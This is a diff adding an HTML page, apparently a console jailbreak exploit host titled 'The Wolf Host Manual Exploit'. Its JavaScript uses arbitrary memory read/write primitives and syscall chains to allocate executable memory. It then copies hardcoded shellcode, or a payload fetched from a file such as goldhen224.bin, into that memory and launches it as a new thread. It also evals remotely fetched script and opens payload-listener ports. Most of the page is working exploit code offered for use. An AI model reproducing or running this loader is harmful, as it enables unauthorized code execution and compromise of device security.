@@ -1,0 +1,1515 @@
+</html>
+<style>
+html, body {
+background-size: 100%;
+background-repeat: no-repeat;
+background-color: #24272b;
+color: white;
+text-align: center;
+margin: 0px;
+overflow: hidden;
+}
+h1 {
+text-shadow: 0.1em 0.1em 0.2em black;
+font-size: 25px;
+text-align: center;
+color: white;
+}
+.TextCaption{
+display: block;
+    font-size: 20px;
+    color: #fff;
+    text-decoration: none;
+}
+a img {
+    display: inline-block;  text-decoration: none;
+}
+a {
+    display: inline-block;  text-decoration: none;
+}
+
+a:hover img, a:hover .TextCaption{
+transform: scale(1.1)
+}
+</style>
+<meta charset="utf-8">
+<title>The Wolf Host Manual Exploit</title>
+<script>
+if (window.applicationCache.status=='0'){window.location.replace("cache.html");}
+  function loadFile(fileName) {
+    let xhr = new XMLHttpRequest();
+    xhr.open("GET", fileName, false);
+    xhr.overrideMimeType("text/plain; charset=x-user-defined");
+    xhr.send();
+    let array = Uint8Array.from(xhr.response, c => c.charCodeAt(0));
+    if (fileName.endsWith(".bz2")) {
+      try {
+        PLS = bzip2.simple(bzip2.array(array));
+      } catch(error) {
+        alert(fileName + ": \"" + error + "\"\n");
+        throw error;
+      }
+    }
+    return array;
+  }
+
+function load_pocj() {
+if (    out_jb == "AllPL")  {
+setTimeout(function(){ let array = loadFile(    PLfile);}, 50);
+setTimeout(function(){
+var payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x1002, -1, 0);
+            var buf = new Uint8Array(1);
+            var buf_addr = p.leakval(buf);
+            var old_buf = p.read8(buf_addr.add32(16));
+            var old_sz = p.read4(buf_addr.add32(24));
+            p.write8(buf_addr.add32(16), payload_buffer);
+            p.write4(buf_addr.add32(24), PLS.length);
+            for(var i = 0; i < PLS.length; i++) buf[i] = PLS[i];
+            p.write8(buf_addr.add32(16), old_buf);
+            p.write4(buf_addr.add32(24), old_sz);
+            var pthread = p.malloc(0x10);
+            chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+            allset();}, 500);
+}
+else if (    out_jb == "Gold")  {
+load_pocB();
+}
+
+}
+
+
+function allset() {
+window.    progress.innerHTML= LoadedMSG
+}
+
+function Binset() {
+window.    progress.innerHTML="Payload Loaded. Send payloads to port 9020";
+alert("Payload Loaded. Send payloads to port 9020");
+}
+
+function Mset() {
+window.    progress.innerHTML="Payload Loaded. Send payloads to port 9021";
+alert("Payload Loaded. Send payloads to port 9021");
+}
+
+function runScript(what)
+{
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', what, false);
+    xhr.send('');
+    eval.call(window, xhr.responseText);
+}
+
+function print(){}
+
+function load_poc2() {
+var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+ var payload_loader = p.malloc32(0x1000);
+ var BLDR = payload_loader.backing;
+ BLDR[0]=0x56415741;BLDR[1]=0x83485541;BLDR[2]=0x894818EC;BLDR[3]=0xC748243C;BLDR[4]=0x10082444;BLDR[5]=0x483C2302;BLDR[6]=0x102444C7;BLDR[7]=0x00000000;BLDR[8]=0x000002BF;BLDR[9]=0x0001BE00;BLDR[10]=0xD2310000;BLDR[11]=0x00009CE8;BLDR[12]=0xC7894100;BLDR[13]=0x8D48C789;BLDR[14]=0xBA082474;BLDR[15]=0x00000010;BLDR[16]=0x000095E8;BLDR[17]=0xFF894400;BLDR[18]=0x000001BE;BLDR[19]=0x0095E800;BLDR[20]=0x89440000;BLDR[21]=0x31F631FF;BLDR[22]=0x0062E8D2;BLDR[23]=0x89410000;BLDR[24]=0x2C8B4CC6;BLDR[25]=0x45C64124;BLDR[26]=0x05EBC300;BLDR[27]=0x01499848;BLDR[28]=0xF78944C5;BLDR[29]=0xBAEE894C;BLDR[30]=0x00001000;BLDR[31]=0x000025E8;BLDR[32]=0x7FC08500;BLDR[33]=0xFF8944E7;BLDR[34]=0x000026E8;BLDR[35]=0xF7894400;BLDR[36]=0x00001EE8;BLDR[37]=0x2414FF00;BLDR[38]=0x18C48348;BLDR[39]=0x5E415D41;BLDR[40]=0x31485F41;BLDR[41]=0xC748C3C0;BLDR[42]=0x000003C0;BLDR[43]=0xCA894900;BLDR[44]=0x48C3050F;BLDR[45]=0x0006C0C7;BLDR[46]=0x89490000;BLDR[47]=0xC3050FCA;BLDR[48]=0x1EC0C748;BLDR[49]=0x49000000;BLDR[50]=0x050FCA89;BLDR[51]=0xC0C748C3;BLDR[52]=0x00000061;BLDR[53]=0x0FCA8949;BLDR[54]=0xC748C305;BLDR[55]=0x000068C0;BLDR[56]=0xCA894900;BLDR[57]=0x48C3050F;BLDR[58]=0x006AC0C7;BLDR[59]=0x89490000;BLDR[60]=0xC3050FCA;
+ chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+ var pthread = p.malloc(0x10); {
+  chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
+  chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+ }
+ chain.run();
+ setTimeout(load_pocl,2000);
+}
+
+function load_pocl() {
+var payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x1002, -1, 0);
+            var buf = new Uint8Array(1);
+            var buf_addr = p.leakval(buf);
+            var old_buf = p.read8(buf_addr.add32(16));
+            var old_sz = p.read4(buf_addr.add32(24));
+            p.write8(buf_addr.add32(16), payload_buffer);
+            p.write4(buf_addr.add32(24), PLS.length);
+            for(var i = 0; i < PLS.length; i++) buf[i] = PLS[i];
+            p.write8(buf_addr.add32(16), old_buf);
+            p.write4(buf_addr.add32(24), old_sz);
+            var pthread = p.malloc(0x10);
+            chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+            setTimeout(load_pocB,2000);
+}
+function load_pocB(){
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET',     PLfile);
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   PLD = req.response;
+   var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
+   var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = p.malloc(0x10);
+   chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+   allset();
+  }
+ };
+}
+function load_goldhen224(){
+    progress.innerHTML="Goldhen 2.2.4... Please wait 20-30 seconds ";LoadedMSG="GoldHEN 2.2.4 Loaded";
+    PLfile = "goldhen224.bin";
+    out_jb = "Gold";
+    if(sessionStorage.Exploit!="yes"){setTimeout(poc, 50);} else {load_pocB();}
+}
+function JB(){
+    progress.innerHTML="Jailbreaking... please wait"; LoadedMSG="Jailbreak Done";
+    out_jb = "JB";
+     if(sessionStorage.Exploit!="yes"){setTimeout(poc, 50);} else {allset();}
+}
+</script>
+</head>
+<br><br><br><br>
+<h1 id=progress style='font-size:25px;text-align:center;'>THE WOLF HACK WELCOME</h1>
+<href id="cnmuhide1"   onmouseover=" 
+(document.getElementById('spoiler2') .style.display='none');
+(document.getElementById('spoiler3') .style.display='none');
+(document.getElementById('spoiler4') .style.display='none');
+(document.getElementById('spoiler5') .style.display='none');
+(document.getElementById('spoiler6') .style.display='none');
+(document.getElementById('spoiler8') .style.display='none')
+(document.getElementById('spoiler7') .style.display='none');"> 
+</href><href id="cnmuhide2"  onmouseover="if(document.getElementById('spoiler2') .style.display=='none') 
+{
+(document.getElementById('spoiler2') .style.display='');
+(document.getElementById('spoiler3') .style.display='none');
+(document.getElementById('spoiler4') .style.display='none');
+(document.getElementById('spoiler5') .style.display='none');
+(document.getElementById('spoiler6') .style.display='none');
+(document.getElementById('spoiler7') .style.display='none')
+(document.getElementById('spoiler8') .style.display='none');}else{document.getElementById('spoiler2') .style.display='none'}"> 
+<a href="#" onclick="load_goldhen224()"onMouseOver="progress.innerHTML='GoldHen v2.2.2.4 By SiSTRO'"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAYAAAA8AXHiAAAACXBIWXMAAAsTAAALEwEAmpwYAAALM2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNy4xLWMwMDAgNzkuYTg3MzFiOSwgMjAyMS8wOS8wOS0wMDozNzozOCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgeG1wOkNyZWF0ZURhdGU9IjIwMjEtMDctMjZUMjA6NTg6NDkrMDM6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjEtMTItMDFUMjA6MzM6MjQrMDI6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDIxLTEyLTAxVDIwOjMzOjI0KzAyOjAwIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjBkMDRkZWI3LWYxZjYtN2Y0Ny1hOGIxLTQxODQ1YTMzNDQ0NSIgeG1wTU06RG9jdW1lbnRJRD0iYWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjRiZTMxZjc5LWRlYTktNDk0NS05M2VjLWNiOWFjZmMyMjVjOSIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOmI2MGY1MTgzLTlmNjctNmI0ZS1iZWYwLTNlZDUzYjcyZTRjYiIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyIgcGhvdG9zaG9wOklDQ1Byb2ZpbGU9InNSR0IgSUVDNjE5NjYtMi4xIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6YjYwZjUxODMtOWY2Ny02YjRlLWJlZjAtM2VkNTNiNzJlNGNiIiBzdEV2dDp3aGVuPSIyMDIxLTA3LTI2VDIwOjU4OjQ5KzAzOjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDo0NjA2OGE3MS0zMTk5LWRkNDUtYTViMC1mN2E1YzRhYmI1ZDUiIHN0RXZ0OndoZW49IjIwMjEtMDctMjZUMjA6NTg6NDkrMDM6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjBkMDRkZWI3LWYxZjYtN2Y0Ny1hOGIxLTQxODQ1YTMzNDQ0NSIgc3RFdnQ6d2hlbj0iMjAyMS0xMi0wMVQyMDozMzoyNCswMjowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIzLjAgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDwvcmRmOlNlcT4gPC94bXBNTTpIaXN0b3J5PiA8cGhvdG9zaG9wOkRvY3VtZW50QW5jZXN0b3JzPiA8cmRmOkJhZz4gPHJkZjpsaT5hZG9iZTpkb2NpZDpwaG90b3Nob3A6MTZmN2I4MzItZTAyMC04ODQ2LWI1MTctMzgyNGM0M2VmYWY1PC9yZGY6bGk+IDxyZGY6bGk+YWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjMzMjk3NmZkLTM2YjItOTE0Mi05MDMyLTUwZDUzNmYzMDUwYzwvcmRmOmxpPiA8cmRmOmxpPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDo0OTdjNTE5Yy1lMjMzLWZmNDQtYmRkZS1hYzE5NzA5YzRjYTE8L3JkZjpsaT4gPHJkZjpsaT5hZG9iZTpkb2NpZDpwaG90b3Nob3A6NGU2YTgzY2ItOWI4MS01NTQ0LWEwYWEtZmZkZDVkM2ZhNWFjPC9yZGY6bGk+IDxyZGY6bGk+YWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjU2MWYzNTBiLThmNzQtMGM0MS04NTc5LWE4MzVjNWEzMGZlYjwvcmRmOmxpPiA8cmRmOmxpPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDo3YWRhMzJmOC05ZmY1LTNiNGMtOTA5Yy05ZDg2NTkwZDIzZTU8L3JkZjpsaT4gPHJkZjpsaT5hZG9iZTpkb2NpZDpwaG90b3Nob3A6OTUyZTZkOWYtMWM5NC1lMjRiLWE4Y2ItY2JlNWUzM2Y5OGI3PC9yZGY6bGk+IDxyZGY6bGk+YWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjk4ZjllY2FhLTE0ZmQtZDk0Zi04ODE5LWRhZWNiOWVmZGI0ODwvcmRmOmxpPiA8cmRmOmxpPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDpiNmQ3MTZmOS0yMTA5LTQyNGQtYjRmYy04ZDlmN2U3NzZhZWI8L3JkZjpsaT4gPHJkZjpsaT5hZG9iZTpkb2NpZDpwaG90b3Nob3A6Y2E2NjY0YjUtYzE1Mi01NjQ5LWE2YzctOGE4YmMxOTJkNDc1PC9yZGY6bGk+IDxyZGY6bGk+YWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOmQ2YmVmNjQwLWVkYjctNTY0NC04OGY4LTc3YmY0YmJjY2RjOTwvcmRmOmxpPiA8cmRmOmxpPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDplOTNhNjgzNC1jYzQ0LWIyNDItODZiZi1iMmJlYjJmODk2OTc8L3JkZjpsaT4gPHJkZjpsaT5hZG9iZTpkb2NpZDpwaG90b3Nob3A6ZjQ0ODRkZmEtYjczMC01MDQxLTg0MTctZTMyYzZlMzZlNzBmPC9yZGY6bGk+IDxyZGY6bGk+YWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOmY5Mjk5Mjc4LWQ5MzQtYTg0MS05MWZiLWQ0NzRmMDVjYmYyYzwvcmRmOmxpPiA8L3JkZjpCYWc+IDwvcGhvdG9zaG9wOkRvY3VtZW50QW5jZXN0b3JzPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnMHEI8AAEGBSURBVHic7Z13eFzVmf8/597pfdSbJRe5947BdFNCbwFMEkhIXVIJu79sNuwmJLBhN5BkIRVCgITQQkkohtANGNu44CJXWbJs9TqaPnduOb8/RmMLcCUIi0Sf57mPJWvunTP3fuc973nPe94jpJQca2oV5YhfqwCFQlAkJW4hkFJiCIFpWfQqCsVSIqRkKxAEYkJQKiVjgF1CiHIp1XKwvwXhkBDjQqpaElaUQEhRTnQJ8TkVEIPezwKyUj4bl/LZHsuK9BlGe4+UzYugMwl6ixD6XiHkZMuiFSgRgi4pKVIUdklJtRAIKWkWgoCUIARpIPue9zncZ/YAJlAjBE5Focs06ZHysNeos6wjvrcfJrZj8q4fIVbuEBY4PEKM86nqqX4hai+XskyV8kqbw4EjHEZ6PJiqisWgBy5yP9kM41xF0841Uiky0SjSsv6WVJR6pGz1S9ngtaxXLIhaYByjjzns+IcVlgXogBscIUW5yCvElFNdrtEFhYXXGHY7nZkMzf39dGYy9PX0kFRVskJg8n5h2S0Ln2VRKCVBIagIh8+q9vvPqpCSibEYPbHYb5osa2tMyucNaDRzxuWfmn9IYemAFzyFcPp0IWaPLS39vi6EsjeVYnUqxR7LojWTIWoY6A4HNocDt9eLy+XCpqr7BAVgGQaaYZBJpdCSSTBNfMkkZaZJjapSDYwuLPzK8Q4HU2KxP9RFo2t0eEaTcq+Z0/c/Jf9QwjIBDTwBGHumy3Vpjdd7Y8qybDudTtak07zT309WCEIVFYybMoWJEyZQXVVFUUEBBQUF+Dwe1PcIyzQM9GyWaDxOZ08P7R0dNDQ2sm3nTl7euxdL06j2+znO42Gyz3f1Yrv96ng2e8LGWGxlP9yvCxF1HrM7cuz4hxCWAHRQfJZVUaqqn5rpdJ7qCYfP2O7xKC92drKzqQnF7WbcrFkcv3Ahc2bPZvasWUwcP55wOIwQR+pGQyqVorm5mXc2bGDd+vWs3bCBjZs28eju3YQVhZMqKzkpELjyDIfjyor+/qqNhvF/CSHaTbAEcOyHSh8N4h9hVJgC7DBntt3+2TKv97N7/H7/G8kka3t7MbxeZk6bxhmnncYF55/PpEmT8Hg8OJ1/nx0xdJ10Ok1HVxevvvYaf33qKdasX093ayu1bjdnVlUxJR43unt6/rLZNN9ogN9YkHX8k4wKP9bC8giBJqWwS7lgoc/31aKiosuXZ7PO53t76dA0ampr+dzVV3P+eecxZvRowuHwkLQ/q2k0t7Swes0a7r73Xl5//XWchsHioiJOBfyRSHJ7NnvrWiF+mYKIBWiMCGvI+aDCsoHilnLxwmDwq87i4gv+mky6Xu7owLDbufSSS/jCNdewePFivD7f0DX+PdTV1fHnxx7jnvvuo3XPHqaHQpzvdlOTTKa3plJ3rjXN27qE6Jb8YwvrY+tjmaAGhDhxvt9/naOw8PyHYzHX8q4uCkpL+cJnP8sXPv95xo8f/5G3a9q0aVRVVTFhwgRu+9nP2LB2LQnT5JM+n7vWML6updPZt+BH/ZB1HOE1j/1X/+j5WArLklJxwMyZHs817nD4/EcSCdfyri6qx43j+q9/nc98+tMUFhYe1TXT6TSxWIxMJoNlmlhSoioKLpcLt8dDMBg84muFQiGuuPxyiouLueXHP+b1V1/lz6bJZT6fe4qU34ik0z2N8H+aEOhHMHA4cns+fPjYCcsC7FA+VVWXugKBy/6aybiWd3UxuraW//re97ji8svxeDyHvY6WydDR2Ul3Vxe79+yhvqGBts5OYrEY2WwWy7JwOBz4fT4KwmFqqqoYX1tLTXU1BQUFhA7jr9lsNpacfjohv58bf/hDXnzuOZ6y2fh0OByYC2dl0unlu6FOOYJo/ZGPWYcPw0JYR2LqBTlROcE+CS4pcLm+vNo0fS/19BAqKuL6b3yDq668EqfLdcjraJpGa1sbL7/6Ksuef56t27bR1dODlkjkHqBpIi0LKUTud1VFqCpCUQgVFjJ5wgQWzp/PeWefzfQZM/B6vQd9L0VRWLBwIf/1ve/R39vLmrff5tVAgIsrKk6e19z89U5d/88+aLMf5h58HIU1LJz3aUfgvEtAATEeLl3i893TUloa+GNLC21S8q1vfIMb/+M/CIdCh7xGc3MzDz36KM/97W+sr6sj1d2NzzCo8PmYGA5T4nLt+6bJgVCGJSUJy6IpFmNnJEKflNh8PsaMHs3ZZ5zB5Zdeypw5cw4ZvrAsi8cef5zv/Md/0Lp7N1eUl3OilNqGrq7bN+j6LZoQqUPdATkw1WQx4rwfFUf6jXRB2VSX63jL5wu81N9Pq2nyyUsu4bovfemQojIMg1deeYXf/f73vPDyy8R6exnr83FCZSWjkkk8qRShZBK7pmFJuW+iTyF3g0zLYpZhEPV66QqF2JxOs3HzZn65bRtvvPkmn1m6lKVLl1JSUnLA91cUhbPOPJNt27fzP7ffzgs9PVSVlDgn22wLduv6lE5YJz6ePvpBGRbCOhIHVgXbJCnPKfX7v77F42FdYyNjJ0/mmquvZlxt7UHPy2QyPPLII9z5y1+y4Z13KHc6Ob+8nBmqSiCbtXp1Pd6aSr1cn0q1GZDRIWbmphtRwOYAnx0CdgiWOJ2nzsxmS6YoirqgrIy3dJ131qxh9+7dNLe08KUvfIEJEycesB3BYJBPLV3Klu3b+fODD7Kiv59PBYOnTYcr4+n09gwkDmq1jmJmYLgwLISlHubvErBDqMJun5pRFNtbqRQ2t5uLL7yQRccdd9Dz9GyWRx5+mB/dfDNNe/Yww+vlTK+XSapKa1dXZLWm/bFBiGeSQqycJWVCIxcrMge9r0kuhrRZCJuhaXNrOzo+UQwn1YbDC8eVlHhG2Ww8393NHb/4BX19ffz7d77DhAkTDtie2tpaLr7gApa//jp1bW3sraxUqnV95qZ0ekYaVvEPNGk9LEay1ZZ1yKPGspQJUp5R6PdfX2+abGpvZ+KECVxywQWECwoOeE1D1/nz44/zw//+b/Y2NnJiYSGXOhwEu7vTm9vbV72u65cp8E3gRSBxBM00gNVO+MEKIT7xViTy48zevd1L7HYuLy3Fk83yxwcf5Laf/Yz29vaDXuTUk0/mvHPOISIEr3d3Y0i5pFZRTrWBUx94k/xhAo6jCB4PJ4ZFq9sV5ZBHl6I4ahVlqjMUYpfTiWK3s/iEE6gdN+6g11y+fDn/c9ttNNbXs7i0lHMMAxmJJN4xjFtfNc3LVXjlg7ZXAc2hKDevSaf/paOrq2WRZXFZRQUOXefBRx/ljw88QDwWO+C5ZWVlLDntNApLStjc00OP00l1IDDfK8RUBwgnkD+ONIA6HBkWwnId/qgOwMweTWNnMklpeTmLFy8mdBCHva2tjQceeohNmzYxweXiZNNEjcfTm03z9o3wvzZo/jDabRfi8Q2a9qXOvr72kxwOzi8vJ93Xx71//CPr1q2Dg4y4J44fz6RJk4gKQYvHQ8jrvXC0EKeEwRYgl1IdBAr5+Hr0w0JYTikPeZQJMdHtcJzXnEzSpWlMmTyZeXPmYLfb33ctS0qef/55nl62jKCqcmFlJSWaRp2uP7JViDtVyHwYbVYGDqcQz23NZr/V3dHRs0hRmFlUxI5t23j4scdoa2s74LnVo0axaMECbF4v9ek0Wu4zFrSCfZcQ7BKCBiGIDXLaJbkRhQ4OXUqPDspwdsiGhbBapTzo0S6lrUxVy+0FBTQbBpYQTJ08mcqqqgNfq7WVp5Yto7ejg5MDAapTKRo1bfVOKX8uoBdy4Q2VDzZysQ2cGx9I19GArBCPrk2l7lESCU71+/GYJs8sW8aqt98+4DUKi4qYO3s2BUVF7I1G6U2lcEt5nEeIKg+5wYKH/WGYgQlre5WUi2rhlvF2+//WwJc8Uvp19g84DnQcK4bFqPBQmVEKBEOKcqHl99Mdi+HyeKipqsJ1gICkaZqsXL2aDXV1VITDzPH5yLS1Zd7WtP9NwsZ8MDgLRAZ+Pppvlgq0AWlgh5TkV/QMBG//WJVMXlahKOMm+ny8097Oug0bOPecc94XPBVCMKamhtKSEur37qUXGO10nhrWtIlO2CkYmOeRMj8ydY2WcvHxDsctqs+3IGaazHM6E650Wt2Yzd7lGgiPDCeGhcXyHvoIeRTlnKyioElJqKiI8oqKA2Z9phIJNmzeTCSVYkZhIeWqSr8QdRFYEwM0KTGkJJGzhGzn8KGOwdiBeiHoBaJC0CcEvQP/9gmxtU3T/uzUNKYXFaGaJuvWr6e+vh4gt0zNMLAGIuHhcJiCYJCMZRGx2XB5vQQUJeiTUgkORNQHROUbLeXi4xyOW9Lh8IIHHA7uB1IFBb5xPt/V1VL6RwnBKCGoGjhqhGD0wHGsGBYW61Czewr4XEBGCDJSEg6FKCkuPqCwkokE3X19eFwuqi0LMxplr2Gs8QsROVBGlgJYQkAut+uASPZ3fxkgKCVuDjhbIHpgu1BVxnu9BIVg686d1O/axbRp0xBCYFkWUkoURcHt8VAwMJGdttuxuVy4hfDZhFB6wBoQVeF4KU+Z6nB8N1FQMPevQH1fH8cHAoRSqfSeZPLlKJg2KTHIdZ92RaHPstAP3MaPjGEhrEM1QgG7nZxPo1sWHpcLv99/wNdG4nHiySSVQlCaSJCKxei2rB2KEJmDWSZNShSgXQh8UubXIe5DBVoG3t8kFwI4UHslWBFojFsW/mwWLxDXNJKp1P7PabOR7449TicVlZUIjwdDSoQQ2EHZNbAAV0B4opSnzbHbf9RRUjLx6WyWxnicU/1+zrWsdDwa/fPObPaJPiESlUAZ0C8laaADSA501ceKYSGsQ90ABZT83/PfdtW2v9ly4KEAJJJJNE3DaVnYdZ2sYZCwrJaIEMbB+vy8P9MKzMs93HcN8T1Ag5R0Aj5y/tmBQgAScEJzv67X+TKZaWGvF8PnwzSMXNhhYFJbGQh4KqqK1+/HX1CAI+/vSRnrkNIICUGtlPOnO523tBQVjX82laLZMPiEx8MZiqInotHHtmWzdyPElnIpzTFC4CNnUbPkHqqdY+vnDAthHYZDWnTTNFFVFTGQ5pLVdfoyGdKmiVcINCH60hxYvAL2WaEp5MTx3qCkBMYKQQ2wVUoiB7nWgNj6Uqa5QxjGNJ/PR5uUpNPpfXN9g7tvwzBIpFIoNhseQOo6JtzoE+LaMVI6p7vdJXsCgdpnNY1eXecch4MTpYxF+/sfeUfX744IsTEK2TEDbT6Y4I8VHwdhvQ+Zd24HHGIhBKqqIi2LWH8/PdEoWSnxCYE8yBc3n9/lABYAbg6ccWeSs1QqMFMI+hUlPwp8d5ty1zSSUsasbBa/qpLq7aWrp2ffa5TB0zNCYOo6Dk3DabfnakTARDtMrJAST0EBdUVFZHbv5jynkwXZLJ2JRFedZf0yKuVGHYiCT4eJppSVQgjFgHYJG8hFQY4pH0thASAElmnuExVAOpOhLxLJWQm3G8jlcOWDmYPJW6cF5MIdh0rjzPtdHsBjWXQO/D7YlA6M4syEZTXb0mkqQyGsWIzXVqzgjJUrmTxxIrquI6XE4XSys6GB7t5eHELg1HWyuk5cylui8FA3fLkynf76/GyWqV4vE/r76dU0tptmpBk2O6GiRIiKeS7X52scjovMbNahZ7OiUFVf2izlHXss621yRuyY8fERVs76IPI+1YBfIqXc52eZhkE2m80FQPMZoAP+zXuxkROVgyMPJObFVALUSUmGdwtWQtYHa/VslvEuF2NNk9dff52v3HAD06dNw+ly4fF6CXq97GpsZN3mzZTb7ZRGo0QSiV0tlvUnE7ZtFuJmZ3+/e2IisbRISm/ENGmREkVVZy5Q1eZKsDulVG3hsL8zHLa/0teHkk5zgdt9UW083rHTMLZkRoR1aN9ADhwWOR9FUdV3dSn5IXzecglFOegcXR4bcBwD4YYP0FYBTBICBdgk5eDopEzBGxsN4/5p7e1XX1BcLJxSsn3VKrauXUthSQnV1dV4TJN4WxujpeREKXFomqwzjCczQuwdWNXdpUn59ac07XflQpxVIcRNoyyLgNfrcBUVVfR7vazv76c+kaA1HiciBLP9fmxgxzQVpDSOdQbXsBDW4ZCAsCxcA994ZaC+gqIo+7pBIPd/Qhw0MW4gr4uF5ET1QZ1dyX4HfqYQvC0EFvu60/71Ut6spFLu6d3dF1/j89lbi4uJqSoeRSHQ14eQEmkYeFMpqWiascU0790sxE9SkBTs61YzOqzpE6JqIhAoLKTB62VbNEpdNEoSKPN6WeD1MjGTkWWxmJ7VtJe2G8ZjAUXRhmZp7pEzLIT1Xv9G4V3zZKZFzvG1qyp2hwPHoMlndbAFO7ClkrBvIQYHTwv84CwciHGtHRB0Uohdq+HfEqnU1sps9sKwzze61Om0WckkZjQqparKtGHE25PJLbst6xWhqr+VQkSdA4MSBYgIQZGqKi4hqsNeLxucTh7MZCiy2RjvcjFF1xljWUZxNptKZTLr2pPJx7ebZl2fEGsUIbLv9QE/aoaFsDoGWZgsUD0QtMx3O/mbbZom2UwGfSA2JAas1sGwABN0nZzjvYAP1v0djvwo8fgBv2udEASE2Nsn5U0rTPPWmmh0jh/KJWBJmTWF0Lqgc5qUdW6wDHK+3ixylrCZXOAWkCJX0E0Px+P2kzSNmQUFjHG50DMZuvv732owjNt3KMqeAim3OkF3kguUjkTeef8NCCkKXVLiz91cmwKYUqIbBplMhkwms090BxNWvrtyQNBPTlQqQxvrMch1tYsHLE+PEBSA5hNipZv9vqIlBGEpMXN/x7QsThg4PzPwurgQpKQ0hZTP7Ewk7h+jKBefLkQhnZ20d3XRCDTAhm4hnjKB7UKwCKgmlw47IqwDIAFDShEAtx1KxMDITs9mQQh8Pt8B5wpdbve+OTnTsrBZFtVwjlfKPQIyBvstVt4ifhChvbcc0eD0FtjftfuBReS+FGbO+iBAICXl7KvntS+mNjA/qBvQM09R4hsNg4QQXaul/NcO02yoFOLHAFHLIgLYhagpgiWWlMIUotkpZZuWs4ApKcQxTdcadsIygKyUjlJFmV6qqksrLKtGCoEhZW6tn2WhpdMkEol9Isp3iZlUCgHYFAUTsKsqM4W4OCHEifnqeoPl+GFYr6OoeZV/0AcN2AoQuhBxKeWajJT36rClAPQERFPQHpCSkKqiD/h0Ai4cOFBhs6Gqb8XBjEr5VIuUy/mQkho/CMNCWHlHUwfCUnqqhPj3GUVFC/D7z+rNZtluGHQkEticTtpaWrjjzjspKytDVVWy2Sw2mw2bqtLQ1ES0rw+/00mLy4Xw+bBLWWoTojTvkwl